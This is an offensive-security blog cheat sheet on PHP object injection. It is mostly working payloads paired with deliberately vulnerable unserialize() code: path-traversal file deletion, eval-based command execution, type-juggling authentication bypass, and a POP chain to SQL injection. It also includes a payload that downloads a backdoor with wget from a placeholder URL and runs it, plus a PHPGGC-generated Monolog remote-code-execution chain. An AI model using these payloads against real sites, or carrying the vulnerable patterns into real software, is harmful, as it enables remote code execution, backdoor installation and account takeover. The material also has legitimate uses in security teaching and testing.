---
layout: post
title: PHP Object Injection Cheat Sheet
date: 2018-10-05 18:40 -0300
categories: [cheatsheet, offensive_security]
tags: [ offensive security, cheat sheet, reverse, shell, backdoor, bash, perl, python, PHP]
---

![Image of PHP Object Injection](/uploads/Screenshot%20from%202018-10-06%2000-59-06.png)

## Description of the vulnerability

PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context.

The vulnerability occurs when __user-supplied input is not properly sanitized__  before being passed to the __unserialize() PHP function__. 

In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:

- The application must have a class which implements a __PHP magic method__ (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a "POP chain".
- All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.

__Example:__
```php
// some PHP code including PHP magic method ...

$user_data = unserialize($_GET['data']);

// some PHP code...
```

## Known Vulnerable Software

| Software  | Version | Reference                                                                                       |
|-----------|---------|-------------------------------------------------------------------------------------------------|
| WordPress | 3.6.1   | https://nvd.nist.gov/vuln/detail/CVE-2013-4338                                                  |
| Magento   | 1.9.0.1 | https://magento.com/security/patches/supee-10415                                                |
| Joomla    | 3.0.3   | https://packetstormsecurity.com/files/121442/Joomla-3.0.3-PHP-Object-Injection.html             |
| IP Board  | 3.3.4   | https://www.exploit-db.com/exploits/22398/                                                      |
| Dotclear  | 2.6.1   | https://www.cvedetails.com/cve/CVE-2014-1613/                                                   |
| OpenCart  | 1.5.6.4 | http://karmainsecurity.com/KIS-2014-08                                                          |
| CubeCart  | 5.2.0   | http://karmainsecurity.com/KIS-2013-02                                                          |
| Drupal    | 7.34    | https://websec.wordpress.com/2015/01/09/drupal-7-34-admin-php-object-injection/                 |
| vBulletin | 5.1.0   | https://blog.sucuri.net/2014/03/security-exploit-patched-on-vbulletin-php-object-injection.html |
| Tuelap    | 7.6-4   | http://karmainsecurity.com/KIS-2014-13                                                          |
| Moodle    | 2.5.0   | http://disse.cting.org/2013/09/16/2013-09-16-moodle-2-5-0-1-badges-external-object-injection    |
| WHMCS     | 5.2.12  | http://security-geeks.blogspot.com/2013/11/whmcs-5112-php-object-injectoin.html                 |

## PHP Magic Methods

| __construct()  | __set()    | __toString()  |
| __destruct()   | __isset()  | __invoke()    |
| __call()       | __unset()  | __set_state() |
| __callStatic() | __sleep()  | __clone()     |
| __get()        | __wakeup() | __debugInfo() |

## Examples of PHP Object Injection

### Exploit with the __destruct method

Vulnerable code:
```php
class Example1
{
   public $cache_file;

   function __construct()
   {
      // some PHP code...
   }

   function __destruct()
   {
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}

// some PHP code...

$user_data = unserialize($_GET['data']);

// some PHP code..
```

Payload:
```http
http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}
```

### Exploit with the __wakeup in the unserialize function

Vulnerable code:

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```

Payload:
```php
# Basic serialized data
a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}

# Command execution
string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
```

### Authentication bypass - Type juggling

Vulnerable code:

```php
$data = unserialize($_COOKIE['auth']);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```

Payload:

```php
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

### Authentication bypass - Object reference

Vulnerable code:

```php
<?php
class Object
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

Payload:

```php
O:6:"Object":2:{s:10:"secretCode";N;s:4:"code";R:2;}
```

### Authentication bypass - Object reference

Vulnerable code:
```php
class Example3
{
   protected $obj;

   function __construct()
   {
      // some PHP code...
   }

   function __toString()
   {
      if (isset($this->obj)) return $this->obj->getValue();
   }
}

// some PHP code...

$user_data = unserialize($_POST['data']);

// some PHP code..
```
Payload:
```php
class SQL_Row_Value
{
   private $_table = "SQL Injection";
}

class Example3
{
   protected $obj;

   function __construct()
   {
      $this->obj = new SQL_Row_Value;
   }
}

print urlencode(serialize(new Example3));
```

## Others exploits

#### Reverse Shell

```php
class PHPObjectInjection
{
    // CHANGE URL/FILENAME TO MATCH YOUR SETUP
    public $inject = "system('wget http://URL/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');";
}

echo urlencode(serialize(new PHPObjectInjection));
```

## Finding and using gadgets (PHPGGC)

PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically. When encountering an unserialize on a website you don't have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them. 

[https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)

```bash
$ ./phpggc -l

Gadget Chains
-------------

NAME                  VERSION           TYPE             VECTOR         I    
Doctrine/FW1          ?                 file_write       __toString     *    
Guzzle/FW1            6.0.0 <= 6.3.2    file_write       __destruct          
Guzzle/RCE1           6.0.0 <= 6.3.2    rce              __destruct          
Laravel/RCE1          5.4.27            rce              __destruct          
Laravel/RCE2          5.5.39            rce              __destruct          
Laravel/RCE3          5.5.39            rce              __destruct     *    
Laravel/RCE4          5.5.39            rce              __destruct          
Magento/SQLI1         ? <= 1.9.3.4      sql_injection    __destruct          
Monolog/RCE1          1.18 <= 1.23      rce              __destruct          
Monolog/RCE2          1.5 <= 1.17       rce              __destruct          
Phalcon/RCE1          <= 1.2.2          rce              __wakeup       *    
Slim/RCE1             3.8.1             rce              __toString          
SwiftMailer/FW1       5.1.0 <= 5.4.8    file_write       __toString          
SwiftMailer/FW2       6.0.0 <= 6.0.1    file_write       __toString          
SwiftMailer/FW3       5.0.1             file_write       __toString          
Symfony/FW1           2.5.2             file_write       DebugImport    *    
Symfony/RCE1          3.3               rce              __destruct     *    
Symfony/RCE2          2.3.42 < 2.6      rce              __destruct     *    
Symfony/RCE3          2.6 <= 2.8.32     rce              __destruct     *    
Yii/RCE1              1.1.19            rce              __destruct          
ZendFramework/RCE1    ? <= 1.12.20      rce              __destruct     * 
```

Example:

```bash
$ ./phpggc monolog/rce1 'phpinfo();'
O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:2;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:10:"phpinfo();";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}}
```

## Thanks to

This article is composed of information found on the folowing links (+ plus some minor additions). I use this article to quick observe or demonstrate situations and as a personal reference to all the infromation needed in exploiting the PHP Object Injection Vulnerability.

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PHP%20serialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PHP%20serialization)

[https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

[https://www.owasp.org/index.php/PHP_Object_Injection](https://www.owasp.org/index.php/PHP_Object_Injection)

[http://location-href.com/php-object-injection/](http://location-href.com/php-object-injection/)

[https://www.ambionics.io/blog/php-generic-gadget-chains](https://www.ambionics.io/blog/php-generic-gadget-chains)

[https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)